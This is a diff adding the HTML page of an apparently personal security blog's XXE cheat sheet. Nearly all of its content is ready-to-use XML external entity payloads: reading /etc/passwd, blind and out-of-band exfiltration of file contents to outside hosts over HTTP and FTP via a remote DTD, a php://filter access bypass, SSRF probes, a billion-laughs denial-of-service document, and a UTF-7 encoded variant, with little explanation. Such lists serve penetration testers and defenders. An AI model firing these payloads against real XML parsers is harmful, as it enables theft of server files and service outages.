@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head><title>
+    
+    
+    
+    Armoghan
+</title>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<link rel="canonical" href="https://example.com/cheatsheets/xxe/xxe/" />
+<link rel="icon" type="image/png" href="https://example.com/image/favicon.ico">
+
+
+<meta name="description" content="
+    LFI Test
+&lt;?xml version=&#34;1.0&#34;?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo (#ANY)&gt;&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt; Blind LFI test (when first case doesn&rsquo;t return anything)
+&lt;?xml version=&#34;1.0&#34;?&gt;&lt;!
+    "
+/>
+<meta property="og:description" content="
+    LFI Test
+&lt;?xml version=&#34;1.0&#34;?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo (#ANY)&gt;&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt; Blind LFI test (when first case doesn&rsquo;t return anything)
+&lt;?xml version=&#34;1.0&#34;?&gt;&lt;!
+    " 
+/>
+
+
+
+
+
+
+<meta property="og:title" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://example.com/cheatsheets/xxe/xxe/" /><meta property="article:section" content="Cheatsheets" />
+
+
+
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="LFI Test
+&lt;?xml version=&#34;1.0&#34;?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo (#ANY)&gt;&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt; Blind LFI test (when first case doesn&rsquo;t return anything)
+&lt;?xml version=&#34;1.0&#34;?&gt;&lt;!"/>
+
+<meta itemprop="name" content="">
+<meta itemprop="description" content="LFI Test
+&lt;?xml version=&#34;1.0&#34;?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo (#ANY)&gt;&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt; Blind LFI test (when first case doesn&rsquo;t return anything)
+&lt;?xml version=&#34;1.0&#34;?&gt;&lt;!">
+
+<meta itemprop="wordCount" content="197">
+<meta itemprop="keywords" content="" />
+
+
+
+
+<link rel="stylesheet" href="https://example.com/main.min.css">
+
+
+
+
+
+<script src="https://example.com/bundle.js"></script>
+
+
+
+
+
+
+
+<script data-ad-client="adsense-key" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', '');
+</script>
+
+
+
+
+
+
+</head>
+
+<body><header id="header">
+  <div class="top-bar">
+    <div class="container-md">
+
+      <div class="row align-items-center">
+        <div class="col-3 col-sm-4 social-buttons d-none d-sm-block">
+          <ul>
+    
+    <li>
+        <a href="https://www.facebook.com/armoghanul.mohmin" target="_blank">
+            <i class="fab fa-facebook"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://twitter.com/Armoghan12" target="_blank">
+            <i class="fab fa-twitter"></i></a>
+    </li>
+    
+
+    
+
+    
+    <li>
+        <a href="https://www.instagram.com/___armoghan/" target="_blank">
+            <i class="fab fa-instagram"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://github.com/Armoghan-ul-Mohmin" target="_blank">
+            <i class="fab fa-github"></i></a>
+    </li>
+    
+
+    
+
+    
+    <li>
+        <a href="http://www.linkedin.com/in/armoghan-ul-mohmin-4289a9248" target="_blank">
+            <i class="fab fa-linkedin"></i></a>
+    </li>
+    
+
+</ul>
+        </div>
+
+        <div class="ra-toggler col-3 col-sm-4 d-block d-sm-none">
+          <button class="bg-dark" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+            <i class="fas fa-bars"></i>
+          </button>
+        </div>
+
+        <div class="col-6 col-sm-4">
+          <h2 class="title"><a href="https://example.com/">Armoghan</a></h2>
+        </div>
+
+        
+        <div class="col-3 col-sm-4">
+          <div class="col col-md-8 offset-md-4 d-none d-sm-block">
+            <form id="cse-search-box-form-id" class="input-group search-bar" onsubmit="return executeQuery('lg');"
+              role="search">
+              <input id="cse-search-input-box-id" type="text" class="form-control" placeholder="Search">
+              <button class="btn" type="submit">
+                <i class="fa fa-search"></i>
+              </button>
+            </form>
+          </div>
+        </div>
+        
+
+      </div>
+    </div>
+  </div>
+
+  <div class="container-md">
+    <nav class="navbar navbar-expand-sm navbar-dark bg-dark">
+      <div class="collapse navbar-collapse" id="navbarNav">
+        <ul class="navbar-nav mx-auto">
+
+          <li class="nav-item d-block d-sm-none">
+            <ul class="social-buttons">
+              <ul>
+    
+    <li>
+        <a href="https://www.facebook.com/armoghanul.mohmin" target="_blank">
+            <i class="fab fa-facebook"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://twitter.com/Armoghan12" target="_blank">
+            <i class="fab fa-twitter"></i></a>
+    </li>
+    
+
+    
+
+    
+    <li>
+        <a href="https://www.instagram.com/___armoghan/" target="_blank">
+            <i class="fab fa-instagram"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://github.com/Armoghan-ul-Mohmin" target="_blank">
+            <i class="fab fa-github"></i></a>
+    </li>
+    
+
+    
+
+    
+    <li>
+        <a href="http://www.linkedin.com/in/armoghan-ul-mohmin-4289a9248" target="_blank">
+            <i class="fab fa-linkedin"></i></a>
+    </li>
+    
+
+</ul>
+            </ul>
+          </li>
+
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="https://example.com/">
+              Home
+            </a>
+          </li>
+          
+          
+          
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown">
+              Blog
+            </a>
+            <div class="dropdown-menu">
+              
+              
+                <a class="dropdown-item" href="https://example.com/posts/">Posts</a>
+              
+              
+              
+                <a class="dropdown-item" href="https://example.com/sections/">Sections</a>
+              
+              
+              
+                <div class="dropdown-divider"></div>
+              
+              
+              
+                <a class="dropdown-item" href="https://example.com/tags/">Tags</a>
+              
+              
+              
+                <a class="dropdown-item" href="https://example.com/cheatsheets/">Cheat Sheets</a>
+              
+              
+            </div>
+          </li>
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="https://armoghan-ul-mohmin.github.io/Portfolio/">
+              Author
+            </a>
+          </li>
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="https://armoghan-ul-mohmin.github.io/Portfolio/Contact.html">
+              Contact
+            </a>
+          </li>
+          
+          
+        </ul>
+
+        
+        <form id="cse-search-box-form-id2" class="d-flex search-bar d-block d-sm-none"
+          onsubmit="return executeQuery('xs');" role="search">
+          <input id="cse-search-input-box-id2" type="text" class="form-control" placeholder="Search">
+          <button class="btn" type="submit">
+            <i class="fa fa-search"></i>
+          </button>
+        </form>
+        
+
+      </div>
+    </nav>
+  </div>
+</header>
+
+<main class="blog-content">
+    <div class="container-md">
+        <div class="row">
+            
+            <div class="col-lg-2 d-none d-xl-block">
+                <div class="ad-left-offset"></div>
+                
+            </div>
+
+            <div class="col-md-12 col-lg-8 px-lg-4">
+                
+
+                <h1 class="title"></h1>
+
+                <div class="container-fluid px-0 mb-4">
+                    <div class="row align-items-end">
+                        <div class="col-md-4 date-time">
+                            <span class="date">
+    Jan 1, 0001
+</span>
+                            &centerdot;
+                            <span class="time-to-read">
+    1 min read</span>
+                        </div>
+
+                        <div class="col-md-8 tags ">
+                            
+                        </div>
+                    </div>
+                </div>
+
+                
+
+                <p><strong>LFI Test</strong></p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE foo [  
+&lt;!ELEMENT foo (#ANY)&gt;
+&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</code></pre><p><strong>Blind LFI test (when first case doesn&rsquo;t return anything)</strong></p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo (#ANY)&gt;
+&lt;!ENTITY % xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;
+&lt;!ENTITY blind SYSTEM &#34;https://www.example.com/?%xxe;&#34;&gt;]&gt;&lt;foo&gt;&amp;blind;&lt;/foo&gt;
+</code></pre><p><strong>Access Control bypass (loading restricted resources - PHP example)</strong></p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ENTITY ac SYSTEM &#34;php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php&#34;&gt;]&gt;
+&lt;foo&gt;&lt;result&gt;&amp;ac;&lt;/result&gt;&lt;/foo&gt;
+</code></pre><p><strong>SSRF Test</strong></p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE foo [  
+&lt;!ELEMENT foo (#ANY)&gt;
+&lt;!ENTITY xxe SYSTEM &#34;https://www.example.com/text.txt&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</code></pre><p><strong>XEE (XML Entity Expansion - DOS)</strong></p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE lolz [
+&lt;!ENTITY lol &#34;lol&#34;&gt;
+&lt;!ELEMENT lolz (#PCDATA)&gt;
+&lt;!ENTITY lol1 &#34;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&#34;&gt;
+&lt;!ENTITY lol2 &#34;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&#34;&gt;
+&lt;!ENTITY lol3 &#34;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&#34;&gt;
+&lt;!ENTITY lol4 &#34;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&#34;&gt;
+&lt;!ENTITY lol5 &#34;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&#34;&gt;
+&lt;!ENTITY lol6 &#34;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&#34;&gt;
+&lt;!ENTITY lol7 &#34;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&#34;&gt;
+&lt;!ENTITY lol8 &#34;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&#34;&gt;
+&lt;!ENTITY lol9 &#34;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&#34;&gt;
+]&gt;
+&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;
+</code></pre><p><strong>XEE #2 (Remote attack - through external xml inclusion)</strong></p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE lolz [
+&lt;!ENTITY test SYSTEM &#34;https://example.com/entity1.xml&#34;&gt;]&gt;
+&lt;lolz&gt;&lt;lol&gt;3..2..1...&amp;test&lt;lol&gt;&lt;/lolz&gt;
+</code></pre><p><strong>XXE FTP HTTP Server</strong></p>
+<p><a href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb">https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb</a></p>
+<p><a href="http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html">http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html</a></p>
+<pre tabindex="0"><code>&lt;!DOCTYPE data [
+&lt;!ENTITY % remote SYSTEM &#34;http://publicServer.com/parameterEntity_sendftp.dtd&#34;&gt;
+%remote;
+%send;
+]&gt;
+&lt;data&gt;4&lt;/data&gt;
+
+File stored on http://publicServer.com/parameterEntity_sendftp.dtd
+
+&lt;!ENTITY % param1 &#34;&lt;!ENTITY &amp;#37; send SYSTEM &#39;ftp://publicServer.com/%payload;&#39;&gt;&#34;&gt;
+%param1;
+</code></pre><p><strong>XXE UTF-7</strong></p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-7&#34;?&gt;
++ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
++ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
++ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
+</code></pre><p>To convert between UTF-8 &amp; UTF-7 use recode.
+<code>recode UTF8..UTF7 payload-file.xml</code></p>
+
+
+                <div id="social-media-share">
+	<p><i>Sharing is caring!</i></p>
+	
+	<div class="share-buttons">
+	    <a  href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fexample.com%2fcheatsheets%2fxxe%2fxxe%2f"
+	        onclick="socialMediaPopUp(this.href, '', 500, 500); return false;"
+	        title="Share on Facebook. Opens in a new window.">
+	        <img src=https://example.com/icons/45px/facebook.png>
+	    </a>
+
+	    <a  href="https://twitter.com/intent/tweet?text=&url=https%3a%2f%2fexample.com%2fcheatsheets%2fxxe%2fxxe%2f"
+	        onclick="socialMediaPopUp(this.href, '', 500, 500); return false;"
+	        title="Share on Twitter. Opens in a new window." >
+	        <img src=https://example.com/icons/45px/twitter.png>
+	    </a>
+
+		<a  href="http://www.reddit.com/submit?url=https%3a%2f%2fexample.com%2fcheatsheets%2fxxe%2fxxe%2f"
+	        onclick="socialMediaPopUp(this.href, '', 900, 500); return false;"
+	        title="Share on Reddit. Opens in a new window." >
+	        <img src=https://example.com/icons/45px/reddit.png>
+	    </a>
+
+	    <a  href="http://pinterest.com/pin/create/button/?url=https%3a%2f%2fexample.com%2fcheatsheets%2fxxe%2fxxe%2f"
+	        onclick="socialMediaPopUp(this.href, '', 900, 500); return false;"
+	        title="Share on Pinterest. Opens in a new window." >
+	        <img src=https://example.com/icons/45px/pinterest.png>
+	    </a>
+
+	    <a  href="http://www.tumblr.com/share/link?url=https%3a%2f%2fexample.com%2fcheatsheets%2fxxe%2fxxe%2f"
+	        onclick="socialMediaPopUp(this.href, '', 900, 500); return false;"
+	        title="Share on Tumblr. Opens in a new window." >
+	        <img src=https://example.com/icons/45px/tumblr.png>
+	    </a>
+
+		<a  href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fexample.com%2fcheatsheets%2fxxe%2fxxe%2f
+			&title=&summary=LFI%20Test%0a%26lt%3b%3fxml%20version%3d%26%2334%3b1.0%26%2334%3b%3f%26gt%3b%0d%26lt%3b%21DOCTYPE%20foo%20%5b%20%26lt%3b%21ELEMENT%20foo%20%28%23ANY%29%26gt%3b%0d%26lt%3b%21ENTITY%20xxe%20SYSTEM%20%26%2334%3bfile%3a%2f%2f%2fetc%2fpasswd%26%2334%3b%26gt%3b%5d%26gt%3b%26lt%3bfoo%26gt%3b%26amp%3bxxe%3b%26lt%3b%2ffoo%26gt%3b%20Blind%20LFI%20test%20%28when%20first%20case%20doesn%26rsquo%3bt%20return%20anything%29%0a%26lt%3b%3fxml%20version%3d%26%2334%3b1.0%26%2334%3b%3f%26gt%3b%0d%26lt%3b%21&source=https://example.com/"
+	        onclick="socialMediaPopUp(this.href, '', 900, 500); return false;"
+	        title="Share on LinkedIn. Opens in a new window." >
+	        <img src=https://example.com/icons/45px/linkedin.png>
+	    </a>
+
+	    <a  href="mailto:?subject=&amp;body=Check out this site https%3a%2f%2fexample.com%2fcheatsheets%2fxxe%2fxxe%2f"
+	        title="Share via Email. Opens in a new window." >
+	        <img src=https://example.com/icons/45px/mail.png>
+	    </a>
+	</div>
+</div>
+
+
+
+
+                
+                <br>
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    (function () {
+        
+        
+        if (window.location.hostname == "localhost")
+            return;
+
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        var disqus_shortname = '';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+            </div>
+
+            <div class="col-lg-2 d-none d-xl-block">
+                <div class="ad-right-offset"></div>
+                
+            </div>
+        </div>
+    </div>
+</main>
+
+<footer class="text-center py-5">
+    <p>
+        
+        © 2021 <a href="https://rafed.github.io/" target="_blank">DevRa</a>.
+        <a href="https://github.com/rafed/BlogRa/" target="_blank">BlogRa</a> theme for
+        <a href="https://github.com/gohugoio/hugo/" target="_blank">
+            Hugo
+        </a>. 
+        
+    </p>
+</footer>
+
+
+<script async src="https://cse.google.com/cse.js?cx=google-cse-key"></script>
+<gcse:searchresults-only></gcse:searchresults-only>
+</body>
+
+</html>
